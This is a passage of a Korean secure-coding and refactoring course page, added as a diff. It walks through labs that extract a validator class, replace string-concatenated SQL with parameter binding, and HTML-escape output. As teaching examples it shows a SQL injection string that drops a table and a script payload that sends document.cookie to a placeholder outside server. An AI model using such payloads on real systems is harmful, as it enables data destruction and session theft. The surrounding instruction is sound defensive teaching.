+  if (ok) { ... }
+  if (ok) { ... }
+  if (ok) { ... }
+  if (ok) { 저장하고 찍는다 } else { 까닭을 찍는다 }
+
+뒤
+  String error = VALIDATOR.check(member, facility, day);
+  if (error != null) {
+      printError(error);
+      return;
+  }
+  저장하고 찍는다</code></p>
+
+<p>검사하는 일을 통째로 다른 클래스에 넘기고, 어긋난 것이 있으면 까닭을 문자열로 돌려받습니다.
+   돌려받은 값이 있으면 거기서 끝내고 나갑니다.</p>
+
+<h4>검사하는 쪽도 깃발 없이 씁니다</h4>
+
+<p class="cmdline"><code>public String check(String member, String facility, String day) {
+    if (isBlank(member))   return "회원 번호가 없습니다";
+    if (isBlank(facility)) return "시설 번호가 없습니다";
+    String[] row = facilities.find(facility);
+    if (row == null)       return "없는 시설입니다 : " + facility;
+    if (!isMonthValid(day)) return "날짜가 올바르지 않습니다 : " + day;
+    if (facilities.usedOn(day) &gt;= Integer.parseInt(row[2]))
+                           return "정원을 넘었습니다";
+    return null;
+}</code></p>
+
+<p>검사가 하나 늘면 줄이 하나 늡니다.
+   앞의 방식에서는 <code>if (ok) { ... }</code> 블록이 통째로 하나 더 붙었습니다.</p>
+
+<h4>나머지 임시 변수도 없앱니다</h4>
+
+<table class="wide">
+  <tr><th style="width:110px">변수</th><th style="width:130px">어떻게</th><th></th></tr>
+  <tr><td><code>sql</code></td><td>없앰</td><td>만들자마자 쓰므로 인자로 바로 넘깁니다</td></tr>
+  <tr><td><code>msg</code></td><td>없앰</td><td>찍는 메서드 안에서 만듭니다</td></tr>
+  <tr><td><code>ok</code></td><td>없앰</td><td>이른 반환으로 갈음합니다</td></tr>
+  <tr><td><code>cap</code></td><td>옮김</td><td>검사하는 쪽에서만 씁니다</td></tr>
+  <tr><td><code>name</code></td><td>남김</td><td>찍을 때 필요합니다</td></tr>
+</table>
+
+<h4>돌려 보고 숫자를 봅니다</h4>
+
+<p class="cmdline"><code>&gt; python 복잡도.py step1\src
+ReservationConsole.java   process            11       2
+ReservationValidator.java check              19       6
+...
+메서드 14개 · 가장 긴 것 19줄 · 최대 복잡도 6
+
+&gt; python 회귀테스트.py before\classes step1\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다
+
+&gt; python 표준검사.py step1\src
+지적 0건</code></p>
+
+<p>process 가 44줄 복잡도 13 에서 11줄 복잡도 2 로 내려왔습니다.
+   복잡도가 가장 높은 자리는 이제 검사 메서드이고 값은 6 입니다.
+   목표로 잡은 10 이하를 채웠습니다.</p>
+
+<div class="note">줄 수는 step1b 와 똑같이 123줄입니다.
+  전체 분량은 그대로인데 한 메서드가 짊어진 분기가 13 에서 2 로 줄었습니다.
+  같은 양의 코드라도 어떻게 나누느냐에 따라 읽는 부담이 달라진다는 뜻입니다.
+  그래서 리팩토링의 성과를 줄 수로 재면 아무것도 안 보입니다.
+</div>
+
+<h4>여기서 커밋합니다</h4>
+
+<p class="cmdline"><code>&gt; git add step1
+&gt; git commit -m "구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)"</code></p>
+
+<p>회귀 테스트가 0개로 나온 상태에서 끊어 둡니다. 다음 실습에서 출력이 바뀌기 때문입니다.</p>
+      <div class="lab">
+  <b class="t">실습 11</b>
+  <b>깃발을 걷어 내 step1 을 만들고 커밋한다</b>
+
+  <p><b>목적</b> — <code>ok</code> 깃발이 만드는 다섯 개의 <code>if</code> 를 없앱니다.
+     검사하는 일을 통째로 다른 클래스에 넘기고, 어긋나면 그 자리에서 나가는 방식으로 바꿉니다.
+     구조 개선은 여기서 끝나고 커밋을 끊습니다.</p>
+
+  <h5>절차 1 — 검사만 모아 본다</h5>
+
+  <p class="cmdline"><code>process 안에서 검사하는 부분만 뽑으면
+
+  회원 번호가 비었는가
+  시설 번호가 비었는가
+  그런 시설이 있는가
+  날짜의 달이 1~12 인가
+  그날 정원이 남았는가
+
+다섯 가지가 전부입니다. 나머지는 저장하고 찍는 일입니다</code></p>
+
+  <h5>절차 2 — 검사하는 클래스를 만든다</h5>
+
+  <p class="cmdline"><code>step1\src\ReservationValidator.java
+
+/** 예약 신청 값을 검사한다. 어긋난 것이 있으면 까닭을 돌려준다. */
+public class ReservationValidator {
+
+    private final FacilityRepository facilities;
+
+    public ReservationValidator(FacilityRepository facilities) {
+        this.facilities = facilities;
+    }
+
+    public String check(String member, String facility, String day) {
+        if (isBlank(member)) {
+            return "회원 번호가 없습니다";
+        }
+        if (isBlank(facility)) {
+            return "시설 번호가 없습니다";
+        }
+        String[] row = facilities.find(facility);
+        if (row == null) {
+            return "없는 시설입니다 : " + facility;
+        }
+        if (!isMonthValid(day)) {
+            return "날짜가 올바르지 않습니다 : " + day;
+        }
+        if (facilities.usedOn(day) &gt;= Integer.parseInt(row[2])) {
+            return "정원을 넘었습니다";
+        }
+        return null;
+    }
+
+    private boolean isBlank(String s) {
+        return s == null || s.isEmpty();
+    }
+
+    private boolean isMonthValid(String day) {
+        int month = Integer.parseInt(day.split("-")[1]);
+        return month &gt;= 1 &amp;&amp; month &lt;= 12;
+    }
+}</code></p>
+
+  <p>어긋난 것이 없으면 <code>null</code> 을 돌려줍니다.
+     까닭을 돌려주는 방식이라 <code>lastError</code> 필드가 필요 없어집니다.</p>
+
+  <div class="note">검사 순서가 그대로 지켜지는 것이 중요합니다.
+    회원 번호를 먼저 보고 시설 번호를 나중에 보는 차례가 바뀌면,
+    둘 다 비었을 때 나오는 메시지가 달라져서 회귀 시험이 깨집니다.
+    옮길 때는 순서까지 그대로 옮기십시오.
+  </div>
+
+  <h5>절차 3 — process 를 줄인다</h5>
+
+  <p class="cmdline"><code>public static void process(String member, String facility, String day, String time) {
+    String error = VALIDATOR.check(member, facility, day);
+    if (error != null) {
+        printError(error);
+        return;
+    }
+    String name = FACILITIES.find(facility)[1];
+    printSql(buildSql(member, facility, day, time));
+    acceptedCount++;
+    printAccepted(name, member, day, time);
+}</code></p>
+
+  <p>열한 줄입니다. <code>sql</code>, <code>msg</code>, <code>ok</code>, <code>cap</code> 이 다 사라졌고 <code>name</code> 만 남았습니다.</p>
+
+  <h5>절차 4 — 컴파일하고 견준다</h5>
+
+  <p class="cmdline"><code>&gt; javac -encoding utf-8 -proc:none -d step1\classes step1\src\*.java
+&gt; java -Dstdout.encoding=utf-8 -cp step1\classes ReservationConsole &gt; step1\출력.txt
+&gt; powershell -c "Compare-Object (Get-Content before\출력.txt) (Get-Content step1\출력.txt)"
+(아무것도 안 나옵니다)</code></p>
+
+  <p>메서드를 열넷으로 쪼개고 클래스를 셋으로 나눴는데 화면은 그대로입니다.</p>
+
+  <h5>절차 5 — 숫자를 본다</h5>
+
+  <p class="cmdline"><code>&gt; python 복잡도.py step1\src
+파일                        메서드                 줄     복잡도
+----------------------------------------------------------
+FacilityRepository.java   seed                4       1
+FacilityRepository.java   find                8       3
+FacilityRepository.java   usedOn              9       4
+ReservationConsole.java   main                9       1
+ReservationConsole.java   process            11       2
+ReservationConsole.java   buildSql            4       1
+ReservationConsole.java   printSql            3       1
+ReservationConsole.java   printAccepted       6       1
+ReservationConsole.java   printError          3       1
+ReservationConsole.java   report              3       1
+ReservationValidator.java ReservationValidator    3       1
+ReservationValidator.java check              19       6
+ReservationValidator.java isBlank             3       2
+ReservationValidator.java isMonthValid        4       2
+----------------------------------------------------------
+메서드 14개 · 가장 긴 것 19줄 · 최대 복잡도 6</code></p>
+
+  <p>process 가 44줄 복잡도 13 에서 11줄 복잡도 2 가 되었습니다.
+     가장 복잡한 자리는 이제 <code>check</code> 이고 값은 6 입니다.
+     목표 10 이하를 채웠습니다.</p>
+
+  <h5>절차 6 — 줄 수를 견준다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Get-ChildItem step1b\src\*.java | Get-Content).Count"
+123
+&gt; powershell -c "(Get-ChildItem step1\src\*.java | Get-Content).Count"
+123</code></p>
+
+  <div class="warn">두 판의 줄 수가 같습니다.
+    같은 123줄인데 한 메서드가 짊어진 분기가 13 에서 2 로 줄었습니다.
+    달라진 것은 분량이 아닌 나누는 자리입니다.
+    <b>리팩토링의 성과를 줄 수로 재면 아무것도 안 보입니다.</b>
+  </div>
+
+  <h5>절차 7 — 체크리스트 앞부분을 닫는다</h5>
+
+  <p class="cmdline"><code>&gt; python 표준검사.py step1\src
+지적 0건
+
+&gt; python 죽은코드.py step1\src
+ReservationConsole.java    32  닿을 수 없는 줄   + "', '" + day + " " + time
+지적 1건  — 오탐
+
+&gt; python 보안약점.py step1\src
+지적 4건  — 실습 12 · 13 에서 고칩니다</code></p>
+
+  <p>보안 약점이 다섯에서 넷으로 줄었습니다.
+     고쳐서 줄어든 것은 아닙니다. <code>buildSql</code> 로 떼어 내면서 한 줄이 두 줄로 나뉘었다가
+     그 가운데 하나가 규칙에 안 걸리게 되었을 뿐입니다.
+     숫자가 줄었다고 좋아지지 않았다는 것을 여기서 한 번 더 확인하십시오.</p>
+
+  <h5>절차 8 — 커밋한다</h5>
+
+  <p class="cmdline"><code>&gt; git add step1a step1b step1
+&gt; git commit -m "구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)"
+&gt; git log --oneline
+a71f3e4 구조 개선 — 메서드 추출 · 이동 · 임시 변수 정리 (기능 동일)
+3f9a2c1 리팩토링 전 — 고칠 코드와 실행 결과</code></p>
+
+  <p>회귀 시험이 0개인 상태에서 끊어 둡니다.
+     다음 실습부터는 출력이 바뀌므로, 여기가 「기능이 그대로인 마지막 지점」입니다.</p>
+
+  <h5>절차 9 — 여기까지의 성과를 적는다</h5>
+
+  <p class="cmdline"><code>분석\구조개선결과.md
+
+| 지표 | before | step1 | 목표 | 판정 |
+|------|--------|-------|------|------|
+| 최대 순환 복잡도 | 19 | 6 | 10 이하 | 통과 |
+| 가장 긴 메서드 | 64줄 | 19줄 | 30줄 이하 | 통과 |
+| 표준 검사 지적 | 5건 | 0건 | 0건 | 통과 |
+| 죽은 코드 | 3건 | 0건 (오탐 1건) | 0건 | 통과 |
+| 회귀 시험 다른 줄 | - | 0개 | 0개 | 통과 |
+| 파일 수 | 1 | 3 | - | - |
+| 줄 수 | 103 | 123 | - | - |</code></p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>오류 메시지가 달라진다</td>
+        <td>검사 순서가 바뀐 것입니다. 절차 2 의 차례를 보십시오</td></tr>
+    <tr><td>정원 검사에서 값이 안 맞는다</td>
+        <td><code>row[2]</code> 를 그대로 쓰십시오. 계산을 고치면 기능이 바뀝니다</td></tr>
+    <tr><td><code>VALIDATOR</code> 를 어디서 만드나</td>
+        <td>Console 의 상수로 두고 저장소를 넘겨 주십시오</td></tr>
+    <tr><td>보안 약점이 줄어서 좋아 보인다</td>
+        <td>절차 7 을 다시 읽으십시오. 고친 것이 아닙니다</td></tr>
+    <tr><td>커밋을 하나로 하면 안 되나</td>
+        <td>안 됩니다. 실습 14 에서 판정 기준이 달라집니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>ReservationValidator.java</code>, 줄어든 <code>process</code>,
+     견준 화면, 복잡도 화면, 줄 수 비교,
+     도구 셋을 돌린 화면, <code>git log</code>, <code>구조개선결과.md</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① <code>ok</code> 와 <code>lastError</code> 를 없앴습니까
+     ② 검사 순서를 그대로 옮겼습니까
+     ③ 복잡도가 6 이 되었습니까
+     ④ 구조 개선만으로 커밋을 끊었습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st12">
+      <h3><i>12</i>SQL 삽입을 막는다</h3>
+      <aside class="side">
+        <p class="pt">값과 명령을 갈라 둡니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-1</p>
+        <b class="sh">용어</b>
+        <p class="v">SQL 삽입 · 바인딩</p>
+      </aside>
+      <div class="bd">
+
+<h4>왜 뚫리는지 봅니다</h4>
+
+<p class="cmdline"><code>"INSERT INTO reservation VALUES ('" + member + "', ..."
+
+member 에 M0005 가 들어오면
+  VALUES ('M0005', ...)              값입니다
+
+member 에 M0005'; DROP TABLE reservation; -- 가 들어오면
+  VALUES ('M0005'; DROP TABLE reservation; --', ...)
+          └ 값 ┘└ 명령 ────────────┘</code></p>
+
+<p>데이터베이스는 문자열을 받아서 해석합니다.
+   값과 명령이 한 문자열에 섞여 있으면 어디까지가 값인지 따옴표로만 가릅니다.
+   그 따옴표를 입력이 닫아 버리면 나머지는 명령이 됩니다.</p>
+
+<h4>자리를 비워 두고 값을 따로 넘깁니다</h4>
+
+<p class="cmdline"><code>public class ReservationSql {
+
+    public static final String INSERT =
+        "INSERT INTO reservation VALUES (?, ?, ?)";
+
+    private final List&lt;String&gt; values = new ArrayList&lt;&gt;();
+
+    public ReservationSql bind(String value) {
+        values.add(value);
+        return this;
+    }
+
+    public String text() {
+        return INSERT;
+    }
+
+    public List&lt;String&gt; values() {
+        return values;
+    }
+
+    @Override
+    public String toString() {
+        return INSERT + "  &lt;- " + values;
+    }
+}</code></p>
+
+<p>뒤의 두 메서드는 나중에 쓸 것 같아서 미리 만들어 둔 것입니다.
+   실습 15 에서 이 둘이 어떻게 되는지 보십시오.</p>
+
+<p>명령은 <code>INSERT</code> 에 박혀 있고 값은 <code>values</code> 에 따로 담깁니다.
+   둘이 한 문자열로 합쳐지는 일이 없으므로 입력이 명령이 될 길이 없습니다.</p>
+
+<h4>부르는 쪽</h4>
+
+<p class="cmdline"><code>private static ReservationSql buildSql(String member, String facility,
+                                       String day, String time) {
+    return new ReservationSql()
+        .bind(member)
+        .bind(facility)
+        .bind(day + " " + time);
+}</code></p>
+
+<h4>돌려 봅니다</h4>
+
+<p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole
+[SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0001, F01, 2026-10-01 09:00]
+...
+[SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0005'; DROP TABLE reservation; --, F01, 2026-10-03 11:00]</code></p>
+
+<p>공격 문자열이 그대로 남아 있습니다. 다만 값 목록 안에 있고 명령 문장에는 안 들어갑니다.</p>
+
+<div class="warn">이 실습은 리팩토링이 아닙니다.
+  화면에 찍히는 글자가 달라졌으니 겉으로 드러나는 동작이 바뀐 것입니다.
+  그래서 실습 11 에서 커밋을 한 번 끊었고, 여기서 다시 끊습니다.
+  <b>기능을 보존하는 작업과 기능을 바꾸는 작업을 한 커밋에 섞지 마십시오.</b>
+</div>
+
+<h4>실무에서는</h4>
+
+<p class="cmdline"><code>이 교안        ReservationSql 이라는 흉내를 냅니다
+실제 JDBC      PreparedStatement 가 같은 일을 합니다
+
+  PreparedStatement ps = conn.prepareStatement(
+      "INSERT INTO reservation VALUES (?, ?, ?)");
+  ps.setString(1, member);
+  ps.setString(2, facility);
+  ps.setString(3, day + " " + time);</code></p>
+
+<p>데이터베이스 없이 원리를 보려고 흉내를 낸 것입니다.
+   실제로는 드라이버가 값을 명령과 갈라 보내므로 우리가 따옴표를 처리할 일이 없습니다.
+   SQL 응용 교과에서 이 자리를 다시 만납니다.</p>
+      <div class="lab">
+  <b class="t">실습 12</b>
+  <b>SQL 을 바인딩 방식으로 바꾼다</b>
+
+  <p><b>목적</b> — 값과 명령이 한 문자열에 섞이는 것을 끊습니다.
+     이 실습부터 출력이 바뀌므로, 바뀌는 줄이 어디인지 미리 짚어 두고 시작하십시오.</p>
+
+  <h5>절차 1 — 지금 무슨 일이 일어나는지 다시 본다</h5>
+
+  <p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp step1\classes ReservationConsole
+...
+[SQL] INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation; --', 'F01', '2026-10-03 11:00')
+
+따옴표를 기준으로 갈라 보면
+  VALUES ('M0005'                     ← 여기까지가 값
+         ; DROP TABLE reservation;    ← 여기부터 명령
+         --', 'F01', ...              ← 주석으로 나머지를 덮음</code></p>
+
+  <h5>절차 2 — 옮겨 놓고 시작한다</h5>
+
+  <p class="cmdline"><code>&gt; copy step1\src\*.java step2\src\
+&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole &gt; step2\출력.txt
+&gt; powershell -c "Compare-Object (Get-Content step1\출력.txt) (Get-Content step2\출력.txt)"
+(아무것도 안 나옵니다)</code></p>
+
+  <h5>절차 3 — 자리를 비워 두는 클래스를 만든다</h5>
+
+  <p class="cmdline"><code>step2\src\ReservationSql.java
+
+import java.util.ArrayList;
+import java.util.List;
+
+/** 물음표 자리에 값을 따로 담아 두는 문장. */
+public class ReservationSql {
+
+    public static final String INSERT =
+        "INSERT INTO reservation VALUES (?, ?, ?)";
+
+    private final List&lt;String&gt; values = new ArrayList&lt;&gt;();
+
+    public ReservationSql bind(String value) {
+        values.add(value);
+        return this;
+    }
+
+    public String text() {
+        return INSERT;
+    }
+
+    public List&lt;String&gt; values() {
+        return values;
+    }
+
+    @Override
+    public String toString() {
+        return INSERT + "  &lt;- " + values;
+    }
+}</code></p>
+
+  <p><code>bind</code> 가 자기 자신을 돌려주므로 점을 찍어 이어 쓸 수 있습니다.
+     <code>text</code> 와 <code>values</code> 는 나중에 데이터베이스에 넘길 때 쓰려고 미리 만들어 둔 것입니다.
+     이 둘이 실습 15 에서 어떻게 되는지 보십시오.</p>
+
+  <h5>절차 4 — 만드는 쪽을 고친다</h5>
+
+  <p class="cmdline"><code>앞
+    private static String buildSql(String member, String facility, String day, String time) {
+        return "INSERT INTO reservation VALUES ('" + member + "', '" + facility
+            + "', '" + day + " " + time + "')";
+    }
+
+뒤
+    private static ReservationSql buildSql(String member, String facility, String day, String time) {
+        return new ReservationSql()
+            .bind(member)
+            .bind(facility)
+            .bind(day + " " + time);
+    }</code></p>
+
+  <p>돌려주는 형이 <code>String</code> 에서 <code>ReservationSql</code> 로 바뀌었으므로
+     받는 <code>printSql</code> 의 인자 형도 같이 바꿔야 합니다.</p>
+
+  <h5>절차 5 — 컴파일하고 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; javac -encoding utf-8 -proc:none -d step2\classes step2\src\*.java
+&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole
+[SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0001, F01, 2026-10-01 09:00]
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-01 09:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0001&lt;/div&gt;
+&lt;div class='sum'&gt;체육관 A / 2026-10-01 / 09:00 / M0001 / 누적 1건&lt;/div&gt;
+[SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0002, F01, 2026-10-01 09:00]
+...
+[SQL] INSERT INTO reservation VALUES (?, ?, ?)  &lt;- [M0005'; DROP TABLE reservation; --, F01, 2026-10-03 11:00]
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-03 11:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0005'; DROP TABLE reservation; --&lt;/div&gt;
+...
+처리 건수 : 3</code></p>
+
+  <p>공격 문자열이 사라지지 않았습니다. 값 목록 안에 그대로 들어 있습니다.
+     달라진 것은 그 글자가 명령 문장 안으로 못 들어간다는 점입니다.</p>
+
+  <h5>절차 6 — 바뀐 줄을 센다</h5>
+
+  <p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole &gt; step2\출력.txt
+&gt; powershell -c "(Compare-Object (Get-Content step1\출력.txt) (Get-Content step2\출력.txt)).Count"
+6</code></p>
+
+  <p><code>Compare-Object</code> 는 없어진 줄과 새로 생긴 줄을 따로 세므로 세 줄이 여섯으로 나옵니다.
+     실제로 달라진 자리는 SQL 을 찍는 세 줄입니다.</p>
+
+  <div class="warn">여기서부터 회귀 시험의 판정 기준이 달라집니다.
+    실습 11 까지는 다른 줄이 하나라도 나오면 잘못한 것이었습니다.
+    지금부터는 다른 줄이 나와야 맞고, 대신 그 줄을 하나씩 설명할 수 있어야 합니다.
+    <b>같은 도구가 구간에 따라 반대의 판정을 냅니다.</b>
+  </div>
+
+  <h5>절차 7 — 도구를 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 보안약점.py step1\src
+ReservationConsole.java    31  SQL 삽입   문자열을 이어 붙여 SQL 을 만듭니다
+ReservationConsole.java    32  SQL 삽입   값을 따옴표 사이에 끼워 넣습니다
+ReservationConsole.java    42  XSS       입력을 HTML 에 그대로 붙입니다
+ReservationConsole.java    47  XSS       입력을 HTML 에 그대로 붙입니다
+지적 4건
+
+&gt; python 보안약점.py step2\src
+ReservationConsole.java    44  XSS       입력을 HTML 에 그대로 붙입니다
+ReservationConsole.java    49  XSS       입력을 HTML 에 그대로 붙입니다
+지적 2건</code></p>
+
+  <p>SQL 삽입 지적 둘이 사라졌습니다. 문자열을 이어 붙이는 자리가 없어졌기 때문입니다.
+     남은 둘은 화면 출력 쪽이고 실습 13 에서 고칩니다.
+     실습 8 에서 찾아낸 대로 도구가 못 짚는 줄이 둘 더 있으니 넷을 다 고쳐야 합니다.</p>
+
+  <h5>절차 8 — 실무에서 쓰는 것과 견준다</h5>
+
+  <p class="cmdline"><code>우리가 만든 것
+    new ReservationSql().bind(member).bind(facility).bind(day + " " + time)
+
+실제 JDBC
+    PreparedStatement ps = conn.prepareStatement(
+        "INSERT INTO reservation VALUES (?, ?, ?)");
+    ps.setString(1, member);
+    ps.setString(2, facility);
+    ps.setString(3, day + " " + time);
+    ps.executeUpdate();
+
+물음표를 두고 값을 따로 넘기는 구조가 같습니다</code></p>
+
+  <p>데이터베이스 없이 원리만 보려고 흉내를 낸 것입니다.
+     실제로는 드라이버가 값을 명령과 갈라서 보내므로 우리가 따옴표를 손볼 일이 아예 없습니다.</p>
+
+  <h5>절차 9 — 문자열을 이어 붙이는 자리가 남았는지 본다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "Select-String step2\src\*.java -Pattern 'INSERT INTO' -SimpleMatch"
+
+ReservationSql.java:8:         "INSERT INTO reservation VALUES (?, ?, ?)";</code></p>
+
+  <p>한 줄뿐이고 그 줄에는 <code>+</code> 가 없습니다. 값이 끼어들 자리가 없다는 뜻입니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td><code>incompatible types</code></td>
+        <td><code>printSql</code> 의 인자 형을 같이 바꾸십시오</td></tr>
+    <tr><td>화면에 객체 주소가 찍힌다</td>
+        <td><code>toString</code> 을 안 만든 것입니다</td></tr>
+    <tr><td>바뀐 줄이 6 이 아니다</td>
+        <td>몇 줄인지보다 어느 줄인지가 중요합니다. 열어 보십시오</td></tr>
+    <tr><td>공격 문자열이 그대로 보인다</td>
+        <td>맞습니다. 값으로만 남는 것이 목적입니다</td></tr>
+    <tr><td>진짜 DB 로 해 보고 싶다</td>
+        <td>SQL 응용 교과에서 합니다. 지금은 구조만 보십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — 공격이 SQL 에 들어가는 화면, <code>ReservationSql.java</code>,
+     고친 <code>buildSql</code>, 실행 화면, 바뀐 줄 수,
+     보안약점 화면, 이어 붙이는 자리를 훑은 화면</p>
+
+  <p><b>스스로 확인</b> —
+     ① 값과 명령이 갈라졌습니까
+     ② 공격 문자열이 값 목록에만 남았습니까
+     ③ SQL 삽입 지적이 사라졌습니까
+     ④ 바뀐 줄이 SQL 세 줄인 것을 확인했습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st13">
+      <h3><i>13</i>화면 출력을 막는다</h3>
+      <aside class="side">
+        <p class="pt">특수 글자를 글자로 바꿉니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-1</p>
+        <b class="sh">용어</b>
+        <p class="v">크로스 사이트 스크립트 · 이스케이프</p>
+      </aside>
+      <div class="bd">
+
+<h4>왜 뚫리는지 봅니다</h4>
+
+<p class="cmdline"><code>System.out.println("&lt;div&gt;신청자 : " + member + "&lt;/div&gt;");
+
+member 에 아래 글자가 들어오면
+  &lt;script&gt;location='http://남의서버/'+document.cookie&lt;/script&gt;
+
+브라우저가 받는 것
+  &lt;div&gt;신청자 : &lt;script&gt;...&lt;/script&gt;&lt;/div&gt;
+
+브라우저는 이것을 글자가 아니라 스크립트로 읽습니다</code></p>
+
+<p>SQL 삽입과 구조가 같습니다.
+   값과 명령이 한 문자열에 섞이고, 꺾쇠가 둘을 가르는 표시 노릇을 합니다.
+   그 꺾쇠를 입력이 직접 써 넣으면 값이 명령이 됩니다.</p>
+
+<h4>바꿔 주는 메서드를 만듭니다</h4>
+
+<p class="cmdline"><code>public final class Html {
+
+    private Html() {
+    }
+
+    public static String escape(String s) {
+        if (s == null) {
+            return "";
+        }
+        return s.replace("&amp;", "&amp;amp;")
+                .replace("&lt;", "&amp;lt;")
+                .replace("&gt;", "&amp;gt;")
+                .replace("\"", "&amp;quot;")
+                .replace("'", "&amp;#39;");
+    }
+}</code></p>
+
+<p>순서가 중요합니다. <code>&amp;</code> 를 가장 먼저 바꿔야 합니다.
+   나중에 바꾸면 앞서 만들어 둔 <code>&amp;lt;</code> 의 <code>&amp;</code> 까지 한 번 더 바뀝니다.</p>
+
+<h4>찍는 자리마다 씌웁니다</h4>
+
+<p class="cmdline"><code>앞
+  System.out.println("&lt;div&gt;신청자 : " + member + "&lt;/div&gt;");
+
+뒤
+  System.out.println("&lt;div&gt;신청자 : " + Html.escape(member) + "&lt;/div&gt;");</code></p>
+
+<h4>돌려 봅니다</h4>
+
+<p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp step2\classes ReservationConsole
+...
+&lt;div&gt;신청자 : M0005&amp;#39;; DROP TABLE reservation; --&lt;/div&gt;</code></p>
+
+<p>작은따옴표가 <code>&amp;#39;</code> 로 바뀌었습니다. 브라우저는 이것을 따옴표 모양의 글자로 그립니다.</p>
+
+<h4>도구를 다시 돌립니다</h4>
+
+<p class="cmdline"><code>&gt; python 보안약점.py step2\src
+ReservationConsole.java    45  XSS   입력을 HTML 에 그대로 붙입니다
+ReservationConsole.java    51  XSS   입력을 HTML 에 그대로 붙입니다
+지적 2건</code></p>
+
+<div class="note">둘 다 오탐입니다.
+  두 줄 다 <code>Html.escape</code> 를 거치는데 도구가 그것을 모릅니다.
+  정규식은 꺾쇠로 끝나는 문자열 뒤에 무엇이 붙는지만 보고, 그 무엇이 어떤 함수인지는 안 봅니다.
+  실습 8 에서는 못 찾는 줄이 있었고 여기서는 안 걸려야 할 줄이 걸립니다.
+  둘 다 같은 한계에서 나옵니다.
+</div>
+
+<h4>분석 결과서의 여섯 줄을 닫습니다</h4>
+
+<p class="cmdline"><code>| 줄 | 약점 | 어떻게 막았나 | 확인 |
+|-----|------|---------------|------|
+| 77 | SQL 삽입 | 바인딩으로 바꿈 | 실행 화면 |
+| 78 | SQL 삽입 | 위와 같음 | 실행 화면 |
+| 82 | XSS | Html.escape | 실행 화면 |
+| 83 | XSS | Html.escape | 실행 화면 |
+| 84 | XSS | Html.escape | 실행 화면 |
+| 87 | XSS | Html.escape | 실행 화면 |</code></p>
+
+<p>83번 줄이 목록에 들어 있는 것을 확인하십시오. 도구가 안 찾은 줄이라 사람이 넣지 않으면 빠집니다.</p>
+
+<h4>여기서 커밋합니다</h4>
+
+<p class="cmdline"><code>&gt; git add step2
+&gt; git commit -m "보안 조치 — SQL 바인딩 · HTML 이스케이프 (출력 5줄 변경)"</code></p>
+
+<p>커밋 메시지에 몇 줄이 바뀌는지를 적어 두면 나중에 되짚기 쉽습니다.</p>
+      <div class="lab">
+  <b class="t">실습 13</b>
+  <b>화면에 나가는 값을 바꾸고 커밋한다</b>
+
+  <p><b>목적</b> — 사용자가 친 값이 화면에서 태그가 되지 않게 막습니다.
+     도구가 짚어 준 두 줄만 고치면 안 되고, 실습 8 에서 사람이 찾아낸 줄까지 넷을 다 고쳐야 합니다.</p>
+
+  <h5>절차 1 — 고칠 줄을 목록으로 만든다</h5>
+
+  <p class="cmdline"><code>분석\보안약점.md 에서 XSS 로 표시한 줄
+
+  예약되었습니다 줄     name · day · time
+  신청자 줄            member          ← 도구가 못 찾은 줄
+  누적 줄              name · member
+  오류 줄              error
+
+넷입니다. 도구가 찾은 것은 둘뿐입니다</code></p>
+
+  <h5>절차 2 — 바꿔 주는 클래스를 만든다</h5>
+
+  <p class="cmdline"><code>step2\src\Html.java
+
+/** HTML 에 들어갈 값을 안전한 글자로 바꾼다. */
+public class Html {
+
+    private Html() {
+    }
+
+    public static String escape(String s) {
+        if (s == null) {
+            return "";
+        }
+        return s.replace("&amp;", "&amp;amp;")
+                .replace("&lt;", "&amp;lt;")
+                .replace("&gt;", "&amp;gt;")
+                .replace("\"", "&amp;quot;")
+                .replace("'", "&amp;#39;");
+    }
+}</code></p>
+
+  <p>생성자를 <code>private</code> 으로 막아 두었습니다.
+     객체를 만들어 쓸 일이 없는 도구 클래스라 실수로 만들지 못하게 하는 관례입니다.</p>
+
+  <h5>절차 3 — 순서를 확인한다</h5>
+
+  <p class="cmdline"><code>&amp; 를 먼저 바꾸는 경우
+  입력  &lt;b&gt;
+  1단계 &amp; → &amp;amp;   바뀔 것 없음
+  2단계 &lt; → &amp;lt;    &amp;lt;b&gt;
+  3단계 &gt; → &amp;gt;    &amp;lt;b&amp;gt;    ← 맞습니다
+
+&amp; 를 나중에 바꾸는 경우
+  1단계 &lt; → &amp;lt;    &amp;lt;b&gt;
+  2단계 &gt; → &amp;gt;    &amp;lt;b&amp;gt;
